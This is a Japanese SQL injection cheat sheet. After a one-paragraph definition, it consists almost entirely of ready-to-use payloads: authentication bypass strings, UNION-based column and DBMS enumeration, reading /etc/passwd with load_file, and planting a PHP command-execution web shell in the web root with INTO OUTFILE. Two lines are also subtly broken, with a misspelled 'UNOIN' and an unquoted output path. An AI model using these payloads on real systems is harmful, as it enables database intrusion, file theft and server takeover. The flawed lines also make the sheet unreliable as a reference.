# SQL injectionとは
データベースを操作するための言語であるSQLの脆弱性を悪用したサイバー攻撃の一種。
攻撃者は、アプリケーションの入力フォームなどを通じて悪意のあるペイロードを注入することで、Webアプリケーションが意図しないSQLクエリを実行させ、データベースを不正に操作する。

## 認証バイパス
```bash
' OR 1=1-- -
' OR 1=1--
' OR 1=1#
# 下記のペイロードはDBにadminというユーザーが存在する場合に有効
admin'-- -
```

## 脆弱性チェック
```bash
' # 構文エラー
' AND 1=1 -- # 正常に表示される
' AND 1=2 -- # 何も返らない、もしくはエラー、表示が変わるなど
```

## カラム数チェック
```bash
' ORDER BY 5-- - # エラーが起こればカラム数が4以下
```

## 画面に表示しているカラムチェック
```bash
# 2,3が表示された場合、2つ目と3つ目の要素が表示される
# 場合によってデータ型を合わせる
' UNION SELECT 1,2,3,4-- -
' UNION SELECT '1','2','3','4'-- -
```

## RDBMSチェック（カラム数の特定が必須, ここでは4とする）
```bash
# MySQL, MariaDB, MSSQLServer
' UNION SELECT null,version(),null,null-- -
' UNION SELECT null,@@version,null,null-- -
# PostgreSQL
' UNION SELECT null,version(),null,null-- -
# SQLite
' UNION SELECT null,sqlite_version(),null,null-- -
```

## MySQL, MariaDBで使用できるクエリ
```bash
# データベース名とユーザー名表示
' UNION SELECT null,database(),user(),null-- -
# ファイル読み込み
' UNOIN SELECT null,load_file('/etc/passwd'),null,null-- -
# ファイル書き込み
' UNION SELECT null,'<?php system($_GET["cmd"]);?>',null,null INTO OUTFILE /var/www/html/webshell.php-- -
```
